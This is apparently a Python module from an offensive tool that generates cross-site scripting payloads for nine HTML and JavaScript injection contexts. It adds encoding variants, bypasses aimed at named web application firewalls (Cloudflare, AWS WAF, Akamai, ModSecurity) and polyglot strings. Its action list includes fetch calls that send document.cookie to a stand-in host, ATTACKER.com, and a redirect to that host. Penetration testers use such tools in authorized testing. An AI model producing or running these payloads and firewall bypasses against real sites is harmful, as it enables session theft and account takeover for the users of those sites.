"""XSS payload generation logic."""


# ── Injection contexts ────────────────────────────────────────────

CONTEXTS = {
    "html": {
        "name": "HTML Body",
        "desc": "Injecting directly into the HTML document body",
    },
    "attr-double": {
        "name": "Attribute (double-quoted)",
        "desc": 'Inside a double-quoted HTML attribute: value="INJECT"',
    },
    "attr-single": {
        "name": "Attribute (single-quoted)",
        "desc": "Inside a single-quoted HTML attribute: value='INJECT'",
    },
    "attr-unquoted": {
        "name": "Attribute (unquoted)",
        "desc": "Inside an unquoted attribute value: value=INJECT",
    },
    "js-single": {
        "name": "JS String (single-quoted)",
        "desc": "Inside a JavaScript single-quoted string: var x='INJECT'",
    },
    "js-double": {
        "name": "JS String (double-quoted)",
        "desc": 'Inside a JavaScript double-quoted string: var x="INJECT"',
    },
    "js-template": {
        "name": "JS Template Literal",
        "desc": "Inside a JS template literal: var x=`INJECT`",
    },
    "url": {
        "name": "URL / href",
        "desc": 'Inside a URL attribute: href="INJECT"',
    },
    "event": {
        "name": "Event Handler",
        "desc": 'Inside an inline event handler: onclick="INJECT"',
    },
}

# ── Actions ───────────────────────────────────────────────────────

ACTIONS = {
    "alert": "alert(1)",
    "console": "console.log(1)",
    "cookie": "fetch('https://ATTACKER.com/?c='+document.cookie)",
    "redirect": "window.location='https://ATTACKER.com/'",
    "fetch": "fetch('https://ATTACKER.com/',{method:'POST',body:document.cookie})",
}

# ── Encoding ──────────────────────────────────────────────────────


def url_encode(s):
    return "".join(f"%{ord(c):02X}" for c in s)


def double_url_encode(s):
    return url_encode(url_encode(s))


def html_entity_encode(s):
    return "".join(f"&#x{ord(c):x};" for c in s)


def hex_encode(s):
    return "".join(f"\\x{ord(c):02x}" for c in s)


def unicode_encode(s):
    return "".join(f"\\u{ord(c):04x}" for c in s)


def fromcharcode_encode(s):
    codes = ",".join(str(ord(c)) for c in s)
    return f"String.fromCharCode({codes})"


def base64_encode(s):
    import base64
    encoded = base64.b64encode(s.encode()).decode()
    return f"atob('{encoded}')"


ENCODINGS = {
    "none": lambda s: s,
    "url": url_encode,
    "double-url": double_url_encode,
    "html-entities": html_entity_encode,
    "hex": hex_encode,
    "unicode": unicode_encode,
    "fromcharcode": fromcharcode_encode,
    "base64": base64_encode,
}


# ── Payload generators ────────────────────────────────────────────

def _html_payloads(js):
    return [
        ("Script tag", f"<script>{js}</script>"),
        ("Img onerror", f"<img src=x onerror={js}>"),
        ("Svg onload", f"<svg onload={js}>"),
        ("Svg/animate", f"<svg><animate onbegin={js} attributeName=x dur=1s>"),
        ("Body onload", f"<body onload={js}>"),
        ("Details ontoggle", f"<details open ontoggle={js}><summary>X</summary></details>"),
        ("Iframe srcdoc", f'<iframe srcdoc="<script>{js}</script>">'),
        ("Input autofocus", f"<input autofocus onfocus={js}>"),
        ("Marquee onstart", f"<marquee onstart={js}>"),
        ("Video onerror", f"<video><source onerror={js}>"),
    ]


def _attr_double_payloads(js):
    return [
        ("Break + onerror", f'" onerror={js} "'),
        ("Break + onfocus", f'" autofocus onfocus={js} "'),
        ("Close tag + script", f'"><script>{js}</script>'),
        ("Close tag + img", f'"><img src=x onerror={js}>'),
        ("Close tag + svg", f'"><svg onload={js}>'),
    ]


def _attr_single_payloads(js):
    return [
        ("Break + onerror", f"' onerror={js} '"),
        ("Break + onfocus", f"' autofocus onfocus={js} '"),
        ("Close tag + script", f"'><script>{js}</script>"),
        ("Close tag + img", f"'><img src=x onerror={js}>"),
        ("Close tag + svg", f"'><svg onload={js}>"),
    ]


def _attr_unquoted_payloads(js):
    return [
        ("Space + onerror", f" onerror={js} "),
        ("Space + onfocus", f" autofocus onfocus={js} "),
        ("Close tag + script", f"><script>{js}</script>"),
        ("Close tag + img", f"><img src=x onerror={js}>"),
    ]


def _js_single_payloads(js):
    return [
        ("Break + execute", f"';{js};//"),
        ("Break + restore", f"';{js};var a='"),
        ("Close script + new", f"</script><script>{js}</script>"),
    ]


def _js_double_payloads(js):
    return [
        ("Break + execute", f'";{js};//'),
        ("Break + restore", f'";{js};var a="'),
        ("Close script + new", f"</script><script>{js}</script>"),
    ]


def _js_template_payloads(js):
    return [
        ("Template expr", "${" + js + "}"),
        ("Break + execute", "`;{js};//".replace("{js}", js)),
        ("Close script + new", f"</script><script>{js}</script>"),
    ]


def _url_payloads(js):
    import base64
    b64 = base64.b64encode(f"<script>{js}</script>".encode()).decode()
    return [
        ("javascript: protocol", f"javascript:{js}"),
        ("javascript: with entities", f"javascript:{html_entity_encode(js)}"),
        ("data: text/html", f"data:text/html,<script>{js}</script>"),
        ("data: base64", f"data:text/html;base64,{b64}"),
    ]


def _event_payloads(js):
    escaped = js.replace("'", "\\'")
    return [
        ("Direct", js),
        ("Eval wrapper", f"eval('{escaped}')"),
        ("Function constructor", f"Function('{escaped}')()"),
        ("setTimeout", f"setTimeout('{escaped}')"),
    ]


_GENERATORS = {
    "html": _html_payloads,
    "attr-double": _attr_double_payloads,
    "attr-single": _attr_single_payloads,
    "attr-unquoted": _attr_unquoted_payloads,
    "js-single": _js_single_payloads,
    "js-double": _js_double_payloads,
    "js-template": _js_template_payloads,
    "url": _url_payloads,
    "event": _event_payloads,
}


# ── WAF bypass payloads ──────────────────────────────────────────

WAF_PROFILES = {
    "cloudflare": "Cloudflare",
    "aws-waf": "AWS WAF",
    "akamai": "Akamai",
    "modsecurity": "ModSecurity CRS",
}


def _waf_payloads(js, waf):
    common = [
        ("Case variation", f"<ScRiPt>{js}</sCrIpT>"),
        ("Double tag", f"<scr<script>ipt>{js}</script>"),
        ("SVG/set onbegin", f"<svg><set onbegin={js} attributename=x>"),
    ]

    specific = {
        "cloudflare": [
            ("CF: Img newline", f"<img\\nsrc=x\\nonerror={js}>"),
            ("CF: Details ontoggle", f"<details open\\nontoggle={js}>"),
            ("CF: SVG animate", f"<svg><animate onbegin={js} attributeName=x dur=1s>"),
        ],
        "aws-waf": [
            ("AWS: Img tab", f"<img\\tsrc=x\\tonerror={js}>"),
            ("AWS: SVG/onload", f"<svg/onload={js}>"),
            ("AWS: Body onpageshow", f"<body onpageshow={js}>"),
        ],
        "akamai": [
            ("Akamai: Object", f"<object data=\"javascript:{js}\">"),
            ("Akamai: Marquee onfinish", f"<marquee behavior=alternate onfinish={js}>x</marquee>"),
        ],
        "modsecurity": [
            ("ModSec: SVG entities", f'<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">'),
            ("ModSec: Backtick", "<script>alert`1`</script>"),
            ("ModSec: No parens", f"<img src=x onerror=alert`1`>"),
        ],
    }

    return common + specific.get(waf, [])


# ── Polyglot payloads ────────────────────────────────────────────

def get_polyglots(js):
    return [
        ("Minimal polyglot", f"'\"><svg/onload={js}>//"),
        ("Attribute + JS", f"'\"><img src=x onerror={js}>//\";\n{js};//"),
        ("Multi-context", f"-->'\"</sCript><svg onload={js}>"),
    ]


# ── Main generate function ───────────────────────────────────────

def generate(context="html", action="alert", custom_js=None,
             encoding="none", waf=None, blocked=None):
    """Generate XSS payloads for the given configuration.

    Returns a list of (name, payload) tuples.
    """
    js = custom_js if custom_js else ACTIONS.get(action, "alert(1)")

    gen = _GENERATORS.get(context, _html_payloads)
    results = gen(js)

    if waf and waf in WAF_PROFILES:
        results.extend(_waf_payloads(js, waf))

    # Apply encoding
    encode_fn = ENCODINGS.get(encoding, lambda s: s)
    if encoding != "none":
        results = [(name, encode_fn(payload)) for name, payload in results]

    # Filter blocked chars
    if blocked:
        blocked_set = set(blocked)
        results = [
            (name, payload) for name, payload in results
            if not any(c in payload for c in blocked_set)
        ]

    return results
